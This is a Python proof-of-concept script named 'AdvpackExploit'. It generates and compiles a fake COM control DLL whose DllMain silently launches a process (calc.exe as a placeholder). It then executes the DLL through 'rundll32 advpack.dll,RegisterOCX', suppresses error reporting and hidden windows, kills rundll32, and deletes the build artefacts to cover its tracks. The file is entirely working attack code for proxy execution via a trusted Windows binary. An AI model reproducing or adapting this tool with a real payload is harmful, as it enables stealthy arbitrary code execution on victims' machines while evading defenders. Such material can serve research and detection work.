import os
import subprocess
import tempfile
import ctypes
import sys
import uuid
import time
import glob

TARGET_DIR = r"C:\Temp\AdvpackExploit"
VS_PATH = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
OCX_NAME = "payload.ocx"
TEMP_FILE_SUFFIX = ".cpp"

DLL_SOURCE = r"""
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <ocidl.h>
#include <objbase.h>

#pragma warning(disable:4838)

// {REPLACE_WITH_GUID}
static const CLSID CLSID_MyFakeControl = {
    0xREPLACE1, 0xREPLACE2, 0xREPLACE3,
    {0xREPLACE4, 0xREPLACE5, 0xREPLACE6, 0xREPLACE7,
     0xREPLACE8, 0xREPLACE9, 0xREPLACE10, 0xREPLACE11}
};
// Forward declarations
class MyClassFactory;
HRESULT STDAPICALLTYPE DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv);
class MyClassFactory : public IClassFactory {
public:
    // IUnknown methods
    STDMETHODIMP QueryInterface(REFIID riid, void **ppv) {
        if (IsEqualGUID(riid, IID_IUnknown) || IsEqualGUID(riid, IID_IClassFactory)) {
            *ppv = static_cast<IClassFactory*>(this);
            AddRef();
            return S_OK;
        }
        *ppv = NULL;
        return E_NOINTERFACE;
    }
    STDMETHODIMP_(ULONG) AddRef() { return 2; }
    STDMETHODIMP_(ULONG) Release() { return 1; }
   
    // IClassFactory methods
    STDMETHODIMP CreateInstance(IUnknown *pUnkOuter, REFIID riid, void **ppv) {
        return CLASS_E_NOAGGREGATION;
    }
    STDMETHODIMP LockServer(BOOL fLock) { return S_OK; }
};
STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    if (IsEqualCLSID(rclsid, CLSID_MyFakeControl)) {
        static MyClassFactory factory;
        return factory.QueryInterface(riid, ppv);
    }
    return CLASS_E_CLASSNOTAVAILABLE;
}
STDAPI DllCanUnloadNow() { return S_FALSE; }
STDAPI DllRegisterServer() {
    return S_OK;
}
STDAPI DllUnregisterServer() { return S_OK; }
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {
    if (ul_reason == DLL_PROCESS_ATTACH) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessA(
            NULL, "calc.exe", NULL, NULL, FALSE,
            CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi
        );
        if (pi.hProcess) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    return TRUE;
}
// Required for VS 2022 compatibility
extern "C" {
    __declspec(dllexport) HRESULT __stdcall DllInstall(BOOL bInstall, LPCWSTR pszCmdLine) {
        return S_OK;
    }
}
"""
def generate_guid():
    guid = uuid.uuid4()
    return [
        f"{guid.fields[0]:08X}", # Data1
        f"{guid.fields[1]:04X}", # Data2
        f"{guid.fields[2]:04X}", # Data3
        *[f"{b:02X}" for b in guid.bytes[8:16]] # Data4 (8 bytes)
    ]
def hide_all_errors():
    ctypes.windll.kernel32.SetErrorMode(0x8007)
    try:
        ctypes.windll.wer.WerSetFlags(0x00000001)
    except:
        pass
def compile_dll():
    c_file = None
    try:
        guid_parts = generate_guid()
        source_code = DLL_SOURCE
        replacements = {
            '0xREPLACE1': f"0x{guid_parts[0]}",
            '0xREPLACE2': f"0x{guid_parts[1]}",
            '0xREPLACE3': f"0x{guid_parts[2]}",
            '0xREPLACE4': f"0x{guid_parts[3]}",
            '0xREPLACE5': f"0x{guid_parts[4]}",
            '0xREPLACE6': f"0x{guid_parts[5]}",
            '0xREPLACE7': f"0x{guid_parts[6]}",
            '0xREPLACE8': f"0x{guid_parts[7]}",
            '0xREPLACE9': f"0x{guid_parts[8]}",
            '0xREPLACE10': f"0x{guid_parts[9]}",
            '0xREPLACE11': f"0x{guid_parts[10]}"
        }
        for old, new in replacements.items():
            source_code = source_code.replace(old, new)
        with tempfile.NamedTemporaryFile(suffix=TEMP_FILE_SUFFIX, delete=False, mode="w") as f:
            c_file = f.name
            f.write(source_code)
        cl_cmd = (
            f'call "{VS_PATH}" x64 && '
            f'cl /nologo /LD "{c_file}" /Fe"{OCX_NAME}" '
            '/link /SUBSYSTEM:WINDOWS /DEFAULTLIB:kernel32.lib ole32.lib oleaut32.lib uuid.lib advapi32.lib /MANIFEST:NO'
        )
        result = subprocess.run(
            cl_cmd,
            shell=True,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode != 0:
            print(f"Compilation failed:\n{result.stderr or result.stdout}")
            return False
        return os.path.exists(OCX_NAME)
    finally:
        if c_file and os.path.exists(c_file):
            try: os.unlink(c_file)
            except: pass

def execute_silently():
    hide_all_errors()
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    subprocess.Popen(
        f'rundll32.exe advpack.dll,RegisterOCX {OCX_NAME}',
        shell=True,
        startupinfo=startupinfo,
        stderr=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    time.sleep(1)
    os.system('taskkill /f /im rundll32.exe >nul 2>&1')

def cleanup():
    patterns = [
        OCX_NAME,
        "*.exp",
        "*.lib",
        "*.obj",
        "*.pdb"
    ]
    for pattern in patterns:
        for file in glob.glob(os.path.join(TARGET_DIR, pattern)):
            try:
                os.remove(file)
            except:
                pass

if __name__ == "__main__":
    os.makedirs(TARGET_DIR, exist_ok=True)
    os.chdir(TARGET_DIR)
    if not os.path.exists(OCX_NAME):
        if not compile_dll():
            sys.exit(1)
    execute_silently()
    cleanup()